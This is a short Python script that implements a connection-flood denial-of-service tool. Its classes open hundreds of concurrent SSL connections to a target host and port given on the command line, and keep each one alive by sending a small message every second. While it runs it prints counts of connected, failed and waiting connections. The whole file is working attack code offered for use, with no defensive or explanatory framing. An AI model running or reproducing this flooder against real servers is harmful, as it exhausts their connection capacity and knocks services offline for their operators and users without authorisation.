#! /usr/bin/env python3

import argparse
import time
import socket
import ssl
import threading

from multiprocessing import RawValue, Lock

# Thread-safe counter:
class Counting():

    def __init__(self, value=0):
        self.val = RawValue('i', value)
        self.lock = Lock()

    def inc(self, by=1):
        with self.lock:
            self.val.value += by

    def dec(self, by=1):
        with self.lock:
            self.val.value -= by

    def get(self):
        with self.lock:
            return self.val.value


# Connection running on dedicated thread:
class Connection(threading.Thread):

    def __init__(self, id, addr, good=None, failed=None):
        threading.Thread.__init__(self)

        self.id = id
        self.addr = addr
        self.good = good
        self.failed = failed

        self.connected = False

    # If connection succeeded, set as "good":
    def succeed(self):
        self.good.inc()

    # If connection failed, set as "failed":
    def fail(self):
        self.failed.inc()

    # If connection lost, unset "good":
    def lose_connection(self):
        self.good.dec()

    def connect(self, timeout=10):
        try:
            # Connect to host with a raw socket:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(timeout)

            # Use SSL with socket:
            self.ssl_sock = ssl.wrap_socket(self.sock)
            self.ssl_sock.connect(self.addr)

            self.connected = True

            return True
        except:
            return False

    def send(self, msg="text"):
        try:
            self.ssl_sock.send(bytes(msg.encode()))
        except:
            self.connected = False

    def keepalive(self, sleep=1):
        # Send messages from time to time:
        while self.connected:
            self.send()
            time.sleep(sleep)

    def run(self):
        if self.connect():
            # If connected, signal success:
            self.succeed()

            # Keep connection alive:
            self.keepalive()

            # If lost connection, signal connection lost:
            self.lose_connection()

        # If connection failed, signal failure:
        self.fail()


# Flood the host with connections:
class Flood():

    def __init__(self, addr, num):
        self.connections = []

        # Count successfull and failed connections:
        self.good = Counting()
        self.failed = Counting()

        # Create connections:
        for i in range(0, num):
            conn = Connection(i, addr, self.good, self.failed)
            conn.daemon = True
            self.connections.append(conn)
    
    def start(self):
        for conn in self.connections:
            conn.start()

        # Return counters for tracking the connections:
        return self.good, self.failed


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", dest="host", help="Host")
    parser.add_argument("--port", dest="port", default="443", help="Port (default 443)")
    parser.add_argument("--max", dest="max", default="300", help="Maximum number of connections (default 300)")
    options = parser.parse_args()
    return options

if __name__ == "__main__":
    options = get_arguments()

    max = int(options.max)

    # Init all connections:
    flooder = Flood((options.host, int(options.port)), max)

    # Start sending stuff to host:
    good, failed = flooder.start()

    exit = False

    # While there are connections with unknown status:
    while not exit and good.get() + failed.get() < max:
        try:
            # Print connections stats:
            print("{:03d}/{:03d}/{:03d}/{:03d} (connected/failed/waiting/total)".format(
                good.get(),
                failed.get(),
                max - good.get() - failed.get(),
                max
            ))
            time.sleep(1)
        except KeyboardInterrupt:
            print("Exiting...")
            exit = True

    print("Total number of connections is {}".format(good.get()))